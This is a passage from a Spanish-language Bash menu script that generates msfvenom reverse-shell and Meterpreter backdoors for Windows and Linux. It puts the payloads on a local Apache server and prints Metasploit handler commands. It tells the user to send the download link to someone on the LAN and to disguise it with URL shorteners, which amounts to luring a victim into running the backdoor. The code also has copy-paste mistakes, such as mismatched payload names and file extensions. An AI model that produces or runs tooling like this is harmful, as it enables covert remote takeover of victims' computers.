		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	 elif [[ $optiondos == 14 || $optiondos == 014 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi
		fi
	fi			
fi	
if [[ $option == 2 || $option == 02 ]]; then
clear
banner4
echo -e                  "\e[0;36m[\e[0;34m01\e[0;36m] \e[1;36mlinux/x64/meterpreter_reverse_http"
echo -e                  "\e[0;36m[\e[0;34m02\e[0;36m] \e[1;36mlinux/x64/meterpreter_reverse_https"
echo -e                  "\e[0;36m[\e[0;34m03\e[0;36m] \e[1;36mlinux/x64/meterpreter_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m04\e[0;36m] \e[1;36mlinux/x64/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m05\e[0;36m] \e[1;36mlinux/x64/shell_bind_tcp"
echo -e                  "\e[0;36m[\e[0;34m06\e[0;36m] \e[1;36mlinux/x64/shell_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m07\e[0;36m] \e[1;36mlinux/x86/meterpreter_reverse_http"
echo -e                  "\e[0;36m[\e[0;34m08\e[0;36m] \e[1;36mlinux/x86/meterpreter_reverse_https"
echo -e                  "\e[0;36m[\e[0;34m09\e[0;36m] \e[1;36mlinux/x86/meterpreter_reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m10\e[0;36m] \e[1;36mlinux/x86/meterpreter/reverse_tcp"
echo -e                  "\e[0;36m[\e[0;34m11\e[0;36m] \e[1;36mlinux/x86/shell_bind_tcp"
echo -e                  "\e[0;36m[\e[0;34m12\e[0;36m] \e[1;36mlinux/x86/shell_reverse_tcp"
echo ""
read -p $"Payload > " optiondos
	if [[ $optiondos == 1 || $optiondos == 01 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "Seleccionado: \e[1;36mlinux/x64/meterpreter_reverse_http"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p linux/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 2 || $optiondos == 02 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 	
  		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x64/meterpreter_reverse_https"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
						fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset linux/x64/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 3 || $optiondos == 03 ]]; then 
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x64/meterpreter_reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.elf \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .elf del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.elf
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $nombre.elf
			mv $nombre.elf Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f elf > $ruta/$nombre.elf
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	elif [[ $optiondos == 4 || $optiondos == 04 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mlinux/x64/meterpreter/reverse_tcp"
		echo ""
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .elf > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .elf al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .elf. Tambien si quieres que el .elf se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .elf al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf > /var/www/html/$nombre.elf
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload linux/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
